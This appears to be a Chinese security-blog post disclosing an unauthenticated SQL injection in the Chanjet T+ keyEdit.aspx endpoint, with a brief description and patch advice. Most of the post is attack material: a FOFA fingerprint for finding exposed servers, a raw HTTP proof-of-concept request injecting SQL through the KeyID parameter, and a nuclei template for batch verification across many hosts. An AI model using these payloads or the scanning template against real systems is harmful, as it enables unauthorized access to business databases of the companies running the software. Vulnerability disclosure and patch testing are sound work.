#  【新洞！】畅捷通TPlus keyEdit.aspx SQL注入漏洞   
day哥  月落安全   2024-06-12 13:55  
  
****畅捷通是用友集团的成员企业,致力于为企业提供高效、方便的解决方案。好生意是畅捷通公司的产品,能够从不同的维度帮助企业提升效率、降低成本。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/DBoCyk48rwC59icfkzNShHoR2Awfs6aYYkmpjsHziab1VxCiaAVTVQJmMfYcMN1vKiboDicB3d0AkzlGY56nCMX1gMA/640?wx_fmt=gif "")  
<table><thead><tr><th width="45">漏洞介绍</th><th width="474" style="word-break: break-all;">畅捷通TPlus keyEdit.aspx SQL注入漏洞<br/></th></tr></thead><tbody><tr><td width="45">漏洞描述</td><td style="word-break: break-all;" width="454"><p>畅捷通T+是⼀款企业管理软件，主要⾯向中⼩企业。它提供了包括财务、采购、销售、库存、⽣产制造、⼈⼒资源等在内的全⾯企业管理解决⽅案。通过畅捷通T+，企业可以实现对业务流程的数字化管理，提⾼⼯作效率，降低成本，增强企业竞争⼒。</p><p>畅捷通T+ /tplus/UFAQD/keyEdit.aspx接⼝处未对⽤⼾的输⼊进⾏过滤和校验，未经⾝份验证的攻击者可以利⽤SQL注⼊漏洞获取数据库中的信息。</p></td></tr><tr><td width="45" style="word-break: break-all;">影响产品</td><td style="word-break: break-all;" width="454">畅捷通T+</td></tr><tr><td width="45">修复方案</td><td style="word-break: break-all;" width="454">请使⽤此产品的⽤⼾尽快打补丁或更新到最新版本：https://www.chanjet.com</td></tr></tbody></table>  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/DBoCyk48rwBdEFyIHR1EGhqLicyHSs6x4WZQjlq5DjBfRUMNB4uA26hNbzgEjKezgAQvoFW6fbjeCgIltyuWjjA/640?wx_fmt=gif "")  
  
用请尽快进行应用系统的检查，确认其中是否存在使用畅捷通T+情况。如果确认存在相关应用的使用，需要立即采取行动，因为这些应用极有可能受到漏洞影响。影响版本：畅捷通 T+ 13.0畅捷通 T+ 16.0  
  
**漏洞指纹**  
  
Fofa指纹  
  
app="畅捷通-TPlus"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBoCyk48rwDpXhAiaTzXNyHCiabE9nfLblsibdzgHxZ8liawfDiaicjjicm6xsUTic9kkTSD6cSeh1opW7GOJhQROgpjRw/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞复现poc**  
```
GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27123456%27)))%20--&preload=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: ASP.NET_SessionId=t5b4ib4lqdfdo5h40mpp5djc
Upgrade-Insecure-Requests: 1
Priority: u=1
Pragma: no-cache

Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBoCyk48rwDpXhAiaTzXNyHCiabE9nfLbl0fCoDY5LSwMYmicKm7n7WjB2RHKvwuoKDlWpiahk25MUltf8Io33bSrA/640?wx_fmt=png&from=appmsg "")  
  
  
**nuclei批量验证脚本**  
```

id: changjietong_keyEdit_sqli

info:
  name: changjietong_keyEdit_sqli
  author: recjl
  severity: high
  description: description
  reference:
    - https://
  tags: tags

requests:
  - raw:
      - |+
        GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http:///tplus/
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: ASP.NET_SessionId=wla51k11mgrzdaydypk0muzb
        If-None-Match: W/"5b450e7e-666d"
        If-Modified-Since: Tue, 10 Jul 2018 19:52:30 GMT
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - ion:u
      - type: status
        status:
          - 200
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DBoCyk48rwDpXhAiaTzXNyHCiabE9nfLbl5F5wN94UJQicfUn3P6waFmF1mAzZuXPxxQ3qkaCKuD6v2S53zpuE7JA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
获取更多的网络安全热讯或者学习交流可以加入群聊！！  
  
